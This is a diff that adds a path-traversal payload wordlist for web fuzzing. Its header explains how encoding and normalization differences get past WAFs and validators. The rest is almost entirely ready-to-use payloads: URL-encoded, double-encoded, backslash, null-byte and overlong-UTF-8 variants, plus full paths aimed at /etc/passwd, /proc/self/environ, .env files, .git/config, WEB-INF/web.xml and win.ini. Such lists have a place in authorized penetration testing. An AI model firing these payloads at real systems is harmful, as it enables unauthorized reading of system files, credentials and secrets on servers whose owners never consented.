@@ -1,0 +1,136 @@
+# Path traversal payloads - every encoding / normalization variant
+# worth trying when a file= / page= / include= / view= parameter
+# might be vulnerable. Different frameworks normalize URLs differently;
+# the layer doing the decode is often different from the layer doing
+# the validation, so:
+#   - WAF allowlists '..' as fine -> backend decodes %2e%2e%2f to ../
+#   - Apache decodes %2f to / before path validation runs
+#   - Node.js path.normalize() collapses '../' but leaves '....//'
+#   - Windows accepts both / and \ as separators
+#
+# Each line is one full traversal token. The trailing target depends
+# on your goal:
+#   - Linux read-only:  /etc/passwd
+#   - Linux config:      /etc/hosts, /proc/self/environ
+#   - Java apps:         /WEB-INF/web.xml
+#   - Node apps:         /package.json
+#   - Windows:           /windows/win.ini
+#
+# Common usage with intruder.py: append the target file to each line
+# of this wordlist (sed) OR set a §MARKER§ that's the whole 'traversal
+# chain + filename'.
+#
+# References:
+#   PortSwigger's path-traversal academy section
+#   OWASP path traversal cheat sheet
+
+# --- Plain (the baseline) ---
+../
+../../
+../../../
+../../../../
+../../../../../
+../../../../../../
+../../../../../../../
+../../../../../../../../
+../../../../../../../../../
+../../../../../../../../../../
+
+# --- URL-encoded slash (%2f) ---
+..%2f
+..%2f..%2f
+..%2f..%2f..%2f
+..%2f..%2f..%2f..%2f
+..%2f..%2f..%2f..%2f..%2f
+..%2f..%2f..%2f..%2f..%2f..%2f
+
+# --- URL-encoded dots (%2e) and slashes ---
+%2e%2e/
+%2e%2e/%2e%2e/
+%2e%2e/%2e%2e/%2e%2e/
+%2e%2e%2f
+%2e%2e%2f%2e%2e%2f
+%2e%2e%2f%2e%2e%2f%2e%2e%2f
+
+# --- Double URL-encoding (filter decodes once, app decodes again) ---
+..%252f
+..%252f..%252f
+..%252f..%252f..%252f
+%252e%252e%252f
+%252e%252e%252f%252e%252e%252f
+
+# --- Backslash variants (Windows + IIS) ---
+..\
+..\..\
+..\..\..\
+..%5c
+..%5c..%5c
+..%5c..%5c..%5c
+%2e%2e%5c
+%2e%2e%5c%2e%2e%5c
+
+# --- Mixed / weird normalizations (some normalizers collapse ../ but miss these) ---
+....//
+....//....//
+....//....//....//
+....\/
+....\/....\/
+.../
+.../...
+..../
+..../....
+
+# --- Null-byte truncation (older PHP, Java with broken extension checks) ---
+../%00
+../../%00
+../../../%00
+
+# --- UTF-8 overlong (Apache + some Java versions accept these) ---
+..%c0%af
+..%c0%af..%c0%af
+..%c0%af..%c0%af..%c0%af
+
+# --- Common full-path payloads (ready to use directly) ---
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+/etc/passwd
+file:///etc/passwd
+../etc/hosts
+../../etc/hosts
+../../../etc/hosts
+../proc/self/environ
+../../proc/self/environ
+../../../proc/self/environ
+../../../../proc/self/cmdline
+../../../../../proc/self/status
+
+# --- Windows-targeted ---
+../../../windows/win.ini
+../../../../windows/win.ini
+..\..\..\windows\win.ini
+..\..\..\..\windows\win.ini
+C:/Windows/win.ini
+C:\Windows\win.ini
+
+# --- Java-specific (when WEB-INF/ is reachable) ---
+../WEB-INF/web.xml
+../../WEB-INF/web.xml
+../../../WEB-INF/web.xml
+
+# --- Node.js / npm (often leaks dep versions / env vars) ---
+../package.json
+../../package.json
+../../../package.json
+../.env
+../../.env
+../../../.env
+
+# --- Git leak (committed by mistake) ---
+../.git/config
+../../.git/config
+../../../.git/config
+../.git/HEAD
